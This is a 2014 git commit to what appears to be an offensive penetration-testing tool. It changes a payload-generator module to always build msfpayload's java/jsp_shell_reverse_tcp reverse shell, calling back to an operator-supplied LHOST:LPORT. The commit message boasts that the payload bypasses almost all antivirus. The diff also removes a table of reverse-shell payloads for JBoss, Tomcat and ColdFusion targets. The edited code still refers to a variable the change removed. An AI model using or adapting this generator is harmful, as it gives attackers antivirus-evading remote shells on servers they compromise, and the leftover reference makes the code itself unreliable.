00d716e385fe00f14ab12bad656ca58df36f1aca
hatRiot <shodivine@gmail.com>
2014-03-04 20:07:28 -0700

    Switched the payload generator to use java/jsp_shell_reverse_tcp.  This bypasses almost all AVs. I do not recommend attempting to sessions -u it, though, as this will surely kill your groove.

--- src/module/generate_payload.py
+++ src/module/generate_payload.py
@@ -12,9 +12,7 @@ def run(options):
     a quick way for us to get a reverse shell on a remote system.
     """
 
-    if not options.remote_os:
-        utility.Msg("Please specify a remote os (-o)", LOG.ERROR)
-        return
+    PAYLOAD = "java/jsp_shell_reverse_tcp"
 
     if not options.remote_service:
         utility.Msg("Please specify a remote service (-a)", LOG.ERROR)
@@ -28,18 +26,11 @@ def run(options):
         utility.Msg("This option requires msfpayload", LOG.ERROR)
         return
 
-    payload = fetch_payload(options)
-
-    if not payload:
-        utility.Msg("Platform %s unsupported" % 
-                            options.remote_service, LOG.ERROR)
-        return
-
     utility.Msg("Generating payload....")
     (lhost, lport) = options.generate_payload.split(":")
 
     resp = getoutput("msfpayload %s LHOST=%s LPORT=%s %s &>/dev/null" %
-                    (payload, lhost, lport, out))
+                    (PAYLOAD, lhost, lport, out))
 
     if "Created by" in resp:
         utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], payload))
@@ -50,33 +41,3 @@ def run(options):
         getoutput("echo %s >> ./src/lib/shell.log" % (payload))
     else:
         utility.Msg("Error generating payload: %s" % resp, LOG.ERROR)
-
-
-def fetch_payload(options):
-    """ Helper function for fetching the payload string
-    """
-
-    payloads = {"windows" : {},
-                "linux"   : {}
-               }
-    if options.remote_service in ["jboss", "tomcat"]:
-    
-        payloads["windows"] = { "x86" : "windows/shell/reverse_tcp",
-                                "x64" : "windows/shell/reverse_tcp"}
-                              
-        payloads["linux"] =  { "x86" : "linux/x86/shell/reverse_tcp",
-                               "x64" : "linux/x64/shell/reverse_tcp"}
-
-    elif options.remote_service in ["coldfusion"]:
-
-        dmap = { "x86" : "java/jsp_shell_reverse_tcp",
-                 "x64" : "java/jsp_shell_reverse_tcp" }
-
-        payloads["windows"] = dmap
-        payloads["linux"] = dmap
-
-    else:
-        # unsupported
-        return None        
-
-    return payloads[options.remote_os][options.arch]
